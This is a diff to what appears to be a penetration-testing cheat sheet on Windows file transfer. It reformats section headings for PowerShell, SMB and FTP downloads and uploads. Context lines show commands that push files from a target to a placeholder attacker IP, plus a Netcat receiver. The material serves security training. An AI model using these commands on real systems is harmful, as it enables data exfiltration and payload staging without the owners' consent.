@@ -7,13 +7,13 @@ In the profane rites of assessment, the movement of relics—scripts, payloads, 
 ---
 
 <details>
-<summary><strong>🪟 Windows</strong></summary>
+<summary><h1>🪟 Windows</h1></summary>
 &nbsp;&nbsp;&nbsp;&nbsp;<details>  
-<summary><strong>📥 Downloads</strong></summary>
+<summary><h2>📥 Downloads</h2></summary>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
-<summary><strong>PowerShell Downloads</strong></summary>  
+<summary><h3>PowerShell Downloads</h3></summary>  
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details> 
-<summary><strong>PowerShell DownloadFile Method</strong></summary>
+<summary><h4>PowerShell DownloadFile Method</h4></summary>
 
 **Sync (Wait for the download to finish)**  
 
@@ -39,7 +39,7 @@ Using Credentials
 
 </details>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
-<summary><strong>PowerShell DownloadString - Fileless Method</strong></summary>
+<summary><h4>PowerShell DownloadString - Fileless Method</h4></summary>
 
 Default  
 ```powershell
@@ -52,7 +52,7 @@ Pipeline input
 ```
 </details>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
-<summary><strong>PowerShell Invoke-WebRequest</strong></summary>
+<summary><h4>PowerShell Invoke-WebRequest</h4></summary>
 
 Default  
 ```powershell
@@ -71,7 +71,7 @@ ByPass SSL/TLS Error
 </details>
 </details>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
-<summary><strong>SMB Downloads</strong></summary>
+<summary><h3>SMB Downloads</h3></summary>
 
 **Prepare the server on Linux**
 
@@ -117,7 +117,7 @@ net use n: /delete /y
 
 </details>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>
-<summary><strong>FTP Downloads</strong></summary>  
+<summary><h3>FTP Downloads</h3></summary>  
 
 Setting up a Python3 FTP Server in Linux
 ```bash
@@ -146,11 +146,11 @@ ftp -i -v -n -s:ftpcommand.txt
 </details>
 </details>
 &nbsp;&nbsp;&nbsp;&nbsp;<details>  
-<summary><strong>📥 Uploads</strong></summary>  
+<summary><h2>📥 Uploads</h2></summary>  
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>  
-<summary><strong>PowerShell Uploads</strong></summary>  
+<summary><h3>PowerShell Uploads</h3></summary>  
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>  
-<summary><strong>PowerShell Base64 Encode & Decode</strong></summary>  
+<summary><h4>PowerShell Base64 Encode & Decode</h4></summary>  
 
 1. Encode File Using PowerShell 
 ```powershell
@@ -175,7 +175,7 @@ md5sum decoded.txt
 ```
 </details>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>  
-<summary><strong>PowerShell Web Uploads</strong></summary>  
+<summary><h4>PowerShell Web Uploads</h4></summary>  
 
 1. Installing a Configured WebServer with Upload in Linux
 ```bash
@@ -190,7 +190,7 @@ Invoke-FileUpload -Uri http://<IP>:<PORT>/upload -File <FILE PATH>
 
 </details>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details>  
-<summary><strong>PowerShell Base64 Web Upload</strong></summary>  
+<summary><h4>PowerShell Base64 Web Upload</h4></summary>  
 
 1. We use Netcat to listen in on a port we specify and send the file as a POST request.
 ```bash
@@ -208,7 +208,7 @@ echo <BASE64 FILE> | base64 -d -w 0 > <FILE>
 </details>
 </details>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details> 
-<summary><strong>SMB Uploads</strong></summary>  
+<summary><h3>SMB Uploads</h3></summary>  
 
 1. Installing WebDav Python modules in Linux
 ```bash
@@ -227,7 +227,7 @@ copy <FILE PATH> \\<IP>\sharefolder\
 If there are no SMB (TCP/445) restrictions, you can use impacket-smbserver the same way we set it up for download operations.
 </details>
 &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<details> 
-<summary><strong>FTP Uploads</strong></summary>  
+<summary><h3>FTP Uploads</h3></summary>  
 
 **1. Start our FTP Server in Linux**
 ```bash
@@ -262,7 +262,7 @@ bye
 ---
 
 <details>
-<summary><strong>🐧 Linux</strong></summary>
+<summary><h1>🐧 Linux</h1></summary>
 
 </details>
 
